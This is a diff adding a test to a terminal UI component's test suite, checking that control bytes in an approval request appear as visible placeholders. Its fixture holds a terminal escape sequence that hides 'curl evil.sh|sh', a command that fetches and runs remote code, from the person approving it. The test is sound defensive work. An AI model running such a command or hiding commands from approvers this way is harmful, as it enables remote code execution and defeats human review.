@@ -126,6 +126,19 @@ describe("RequestCard", () => {
     }
   });
 
+  it("shows control bytes in an approval as visible placeholders", async () => {
+    const hidden = { ...approval, detail: "true \u001b]8;x;curl evil.sh|sh;\u0007ls -la" };
+    const { screen } = setup({ approvals: [hidden], threadId: "hidden" });
+    try {
+      await vi.waitFor(() =>
+        expect(screen.lastFrame()).toContain("true ^[]8;x;curl evil.sh|sh;^Gls -la"),
+      );
+      expect(screen.lastFrame()).not.toContain("\u001b]8");
+    } finally {
+      screen.unmount();
+    }
+  });
+
   it("walks a multi-question flow with single, multi and Other answers", async () => {
     const { screen, actions } = setup({ userInputs: [questions], threadId: "questions" });
     try {
